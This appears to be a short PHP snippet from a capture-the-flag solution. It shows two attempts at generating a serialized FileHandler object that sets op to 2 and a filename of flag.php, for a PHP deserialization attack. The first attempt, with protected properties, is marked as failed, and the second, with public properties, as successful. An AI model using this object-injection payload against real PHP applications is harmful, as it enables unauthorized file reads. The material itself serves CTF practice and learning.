//TRY 1
<?php
  class FileHandler {
  protected $op = 2;
  protected $filename ='flag.php';
  protected $content;
}
$a = new FileHandler();
echo serialize($a);
?>
//失败，[Result]:Bad Hacker!

//TRY 2
<?php
  class FileHandler {
  public $op = 2;
  public $filename ='flag.php';
  public $content;
}
$a = new FileHandler();
echo serialize($a);
?>
//成功